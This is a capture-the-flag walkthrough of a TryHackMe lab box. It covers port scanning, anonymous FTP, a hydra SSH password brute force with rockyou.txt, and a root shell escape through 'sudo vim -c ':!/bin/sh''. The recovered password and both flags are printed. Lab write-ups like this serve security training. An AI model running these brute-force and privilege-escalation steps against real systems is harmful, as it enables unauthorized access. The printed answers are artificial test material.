
https://tryhackme.com/room/easyctf

BoxIP = 10.10.11.239

**Basic Enumeration**

        ┌──(root💀kali)-[/home/kali/simple]
    └─# rustscan --ulimit 5000 -b 250 -a 10.10.11.239 -- -A


    PORT     STATE SERVICE REASON         VERSION
    21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.9.2.110
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 1
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: TIMEOUT
    80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    | http-robots.txt: 2 disallowed entries 
    |_/ /openemr-5_0_1_3 
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)


Okay we have a few things to start looking at: FTP anonymous, a web server with a robots.txt and SSH (most likely for later)

**FTP Anonymous**

    ftp> ls -la
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 .
    drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
    drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
    226 Directory send OK.
    ftp> cd pub
    250 Directory successfully changed.
    ftp> ls -la
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
    drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
    -rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
    226 Directory send OK.
    ftp> get ForMitch.txt

Alright we have a file that we can now take a look at and potententially a user name: Mitch

    ┌──(root💀kali)-[/home/kali/simple]
    └─# cat ForMitch.txt 
    Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!



Well that is good news for us, but bad news for this company culture...

If the password is weak... lets see if we can hydra into the ssh with rockyou.txt and mitch as the user

    ┌──(root💀kali)-[/home/kali/simple]
    └─# hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.11.239 ssh -s 2222                    255 ⨯
    Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-24 13:03:55
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking ssh://10.10.11.239:2222/
    [2222][ssh] host: 10.10.11.239   login: mitch   password: secret

And we can now get onto the server, wow this is a simple box...

    Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
    $ whoami
    mitch
    $ pwd 
    /home/mitch
    $ id
    uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
    $ ls -la
    total 36
    drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
    drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
    -rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
    -rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
    -rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
    drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
    -rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
    -rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
    -rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
    $ cat user.txt
    G00d j0b, keep up!
    $ 
We got the user flag now lets do some priveEsc

**PrivEsc**

    $ sudo -l
    User mitch may run the following commands on Machine:
        (root) NOPASSWD: /usr/bin/vim


Looks like we have an easy privesc with vim using GTFO bins


    $ sudo vim -c ':!/bin/sh'
    # whoami
    root


    # cd /root
    # ls -la
    total 28
    drwx------  4 root root 4096 aug 17  2019 .
    drwxr-xr-x 23 root root 4096 aug 19  2019 ..
    -rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
    drwx------  2 root root 4096 aug 17  2019 .cache
    drwxr-xr-x  2 root root 4096 aug 17  2019 .nano
    -rw-r--r--  1 root root  148 aug 17  2015 .profile
    -rw-r--r--  1 root root   24 aug 17  2019 root.txt
    # cat root.txt
    W3ll d0n3. You made it!


All done! This is a fun little snack
